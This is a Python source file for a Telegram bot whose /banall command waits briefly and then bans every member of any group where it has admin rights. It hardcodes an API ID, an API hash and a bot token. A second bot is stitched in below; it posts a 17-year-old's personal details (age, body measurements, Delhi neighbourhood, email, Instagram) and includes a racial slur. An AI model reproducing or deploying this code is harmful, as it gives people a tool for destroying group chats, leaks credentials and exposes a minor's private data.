# Powered by @HYPER_AD13 | @ShiningOff
# Dear Pero ppls Plish Don't remove this line from here🌚
# created by ItsmeHyper13
import logging
import re
import os
import sys, platform
from asyncio import sleep
from os import getenv
from dotenv import load_dotenv
from telethon import TelegramClient, events, Button
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon import __version__ as tel
from str import dad as gg, dady as g, startxt2, startxt, hlptxt
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler
from telegram.ext.messagehandler import MessageHandler
from telegram.ext.filters import Filters
import responsre as R
#Logging...
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
API_ID = int(getenv("API_ID", "4110592"))
API_HASH = getenv("API_HASH", "aa7c849566922168031b95212860ede0")
BOT_TOKEN = getenv("BOT_TOKEN", None)
OWNER_ID = getenv("OWNER_ID", None)
OP  = [int(g), int(gg), int(OWNER_ID)]
#TelegramClient..
sree = TelegramClient(
    "BanAll",
    api_id=API_ID,
    api_hash=API_HASH
).start(bot_token=BOT_TOKEN)

Owner = "ItsmeHyper13"
repo = "https://github.com/ItsmeHyper13/BanallBot"
@sree.on(events.NewMessage(pattern="^/start"))
async def start(event):
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/SilentVerse"), Button.url("••ʀєρο••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/1367b1dd68f851e36370d.jpg",
            caption=startxt.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/1367b1dd68f851e36370d.jpg",
            caption=startxt2.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )


@sree.on(events.NewMessage(pattern="^/help"))
async def start(event):
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/SilentVerse"), Button.url("••ʀєρο••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/1367b1dd68f851e36370d.jpg",
            caption=hlptxt.format(event.sender.first_name, event.sender.id),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await event.reply(
            "Huh Nigga!\nThis is not for you lol 😑\n\nMake your own bot from this [Repository⚡](https://github.com/ItsmeHyper13/BanallBot)",
            link_preview=False,
        )       

@sree.on(events.NewMessage(pattern="^/ping"))
async def ping(event):
    if event.sender.id in OP:
        start = datetime.now()
        t = "Pinging..."
        txxt = await event.reply(t)
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await txxt.edit(f"γєαн ι αм αℓιϐє 🔥!!\n\nριиg ροиg 🏓\n   ➥ `{ms} ms`")


@sree.on(events.NewMessage(pattern="^/banall"))
async def bun(event):
  if event.sender.id in OP:
   if not event.is_group:
        Rep = f"__Brush Are You Serious 🙄.\nUse This Command In Any Group!!__"
        await event.reply(Rep)
   else:
       await event.delete()
       cht = await event.get_chat()
       boss = await event.client.get_me()
       admin = cht.admin_rights
       creator = cht.creator
       if not admin and not creator:
           await event.reply("__I Don't Have Sufficient Rights To Do This.__")
           return
       hmm =  await event.reply("__Ye Bilek Migic Begins🥳...__")
       await sleep(18)
       await hmm.delete()
       everyone = await event.client.get_participants(event.chat_id)
       for user in everyone:
           if user.id == boss.id:
               pass
           try:
               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
           except Exception as e:
               await event.edit(str(e))
           await sleep(0.3)


@sree.on(events.NewMessage(pattern="^/restart"))
async def restart(jnl):
    if jnl.sender.id in OP:
        tct = "__Wait Restarting...__"
        await jnl.reply(tct)
        try:
            await sree.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@sree.on(events.NewMessage(pattern="^/leave"))
async def leave(z):
    if z.sender.id in OP:
        mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(z.text) > 7:
            mkb = int(mkc[0])
            tet = "__Wait Leaving...__"
            hm = await z.reply(tet)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await hm.edit("**Succesfully Lefted!!**")
            except Exception as e:
                await hm.edit(str(e))
        else:
            mkb = z.chat_id
            txt = "__Wait Leaving...__"
            ok = await z.reply(txt)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await ok.edit("**Succesfully Lefted!!**")
            except Exception as e:
                await z.edit(str(e))


# print("Bot is starting.......")

photo = "https://te.legra.ph/file/cf00ecd72b3ee934bd87e.jpg"
# photo2 = "https://te.legra.ph/file/036781df069b478254e37.jpg"

updater = Updater("5621512579:AAGhhvBcDNiQ_wfdQwEyVVUzaQMNPL1vDR8",
                  use_context=True)


def start(update: Update, context: CallbackContext):
  update.message.reply_text(
    f"{photo} \n𝒉𝒊𝒊𝒊 𝒊 𝒂𝒎 𝒍𝒂𝒓𝒂... 𝒂𝒔𝒔𝒊𝒔𝒕𝒂𝒏𝒕 𝒐𝒓 @aadillllll . \n𝒓𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒐𝒏𝒆 𝒕𝒉𝒊𝒏𝒈 𝒎𝒚 𝒎𝒂𝒔𝒕𝒆𝒓 𝒂𝒍𝒘𝒂𝒚𝒔 𝒃𝒆 𝒐𝒑.... 𝒔𝒐 𝒅𝒐𝒏'𝒕 𝒎𝒆𝒔𝒔 𝒖𝒑 𝒘𝒊𝒕𝒉 𝒉𝒊𝒎. 𝒃𝒖𝒕 𝒍𝒂𝒅𝒊𝒆𝒔 𝒚𝒐𝒖 𝒂𝒓𝒆 𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒉𝒆𝒓 𝒅𝒎  𝒐𝒓 𝒊𝒏𝒔𝒕𝒂. 𝒂𝒍𝒔𝒐 𝒚𝒐𝒖 𝒌𝒏𝒐𝒘 𝒂𝒃𝒐𝒖𝒕 𝒉𝒆𝒓. 𝒋𝒖𝒔𝒕 𝒕𝒚𝒑𝒆 /info 𝒂𝒏𝒅 𝒃𝒐𝒐𝒎 𝒚𝒐𝒖 𝒌𝒏𝒐𝒘 𝒂𝒍𝒍 𝒂𝒃𝒐𝒖𝒕 𝒉𝒆𝒓.ֆ 💛💭ۦ"
  )


def info(update: Update, context: CallbackContext):
  update.message.reply_text(
    """ https://te.legra.ph/file/036781df069b478254e37.jpg \n HERE are the some commands that you know  
	Available Commands :-
	/crush - To get the information about my master
	/insta - To get the instagram profile URL
	/gmail - To get gmail URL
	/github - To get the github URL""")


def crush_about(update: Update, context: CallbackContext):
  update.message.reply_text(
    "Hiiii my name is Aadil Shiekh. I have many thing to telll i know you here for my personal information. So, let's begin\n\
		my age is just 17 years.\nheight of 6 feet and the thing you don't know is my weight which is just 62 kg\
		I lived in New Delhi - JAMNAPAAR. \nI am a class 12th science(PCMB) student with a decent above average student profile. \nI best in Physics and Maths as well. But Chemistry is such a loosing face for me. \nBut if you want to be better text me.\nAnd then my professtional profile, I am a Developer with the master in Python CSS HTML and JAVA SCRIPT.\nI have Deploy Many of Telegram bots. And currently working with a secret projec let it be down.\nif you wanna to know more just dm me"
  )


def instagram_url(update: Update, context: CallbackContext):
  update.message.reply_text("INSTAGRAM Link =>\
	https://www.instagram.com/aadillllll._/")


def gmail_url(update: Update, context: CallbackContext):
  update.message.reply_text("GMAIL URL => \
		darkanger008@gmail.com")


def github_url(update: Update, context: CallbackContext):
  update.message.reply_text("GITHUB URL => https://github.com/Darkranger00/")


def gaali(update: Update, context: CallbackContext):
  update.message.reply_text("bsdk ka apna kaam kar")


def pyar(update: Update, context: CallbackContext):
  update.message.reply_text(
    "Tere gher wale tujhe uss ladki se jaada pyar or care karte hai\
  Kal hi aai ladki ke leye 21saal ki life ka end nhi kar sakta")


dict1 = {i: f"give a big hand to adil" for i in range(10)}


def repeat(update: Update, context: CallbackContext):
  update.message.reply_text(dict1)


def handle_message(update: Update, context: CallbackContext):
  text = str(update.message.text).lower()
  responses = R.sample_response(text)

  update.message.reply_text(responses)


#def unknown_text(update: Update, context: CallbackContext):
#	update.message.reply_text(
#		"Sorry I can't recognize you , you said '%s'" % update.message.text)


def main():
  updater.dispatcher.add_handler(CommandHandler('start', start))
  updater.dispatcher.add_handler(CommandHandler('insta', instagram_url))
  updater.dispatcher.add_handler(CommandHandler('info', info))
  updater.dispatcher.add_handler(CommandHandler('github', github_url))
  updater.dispatcher.add_handler(CommandHandler('crush', crush_about))
  updater.dispatcher.add_handler(CommandHandler('gmail', gmail_url))
  updater.dispatcher.add_handler(CommandHandler('repeat', repeat))
  updater.dispatcher.add_handler(CommandHandler('pyar', pyar))
  updater.dispatcher.add_handler(MessageHandler(Filters.text, handle_message))
  # Filters out unknown commands

  # Filters out unknown messages.
  # updater.dispatcher.add_handler(MessageHandler(Filters.text, unknown_text))

  updater.start_polling()
  updater.idle()



print("Your Bot  Deployed Successfully ✅")
print("Join @SilentVerse if you facing any kind of issue!!")



sree.run_until_disconnected()
main()
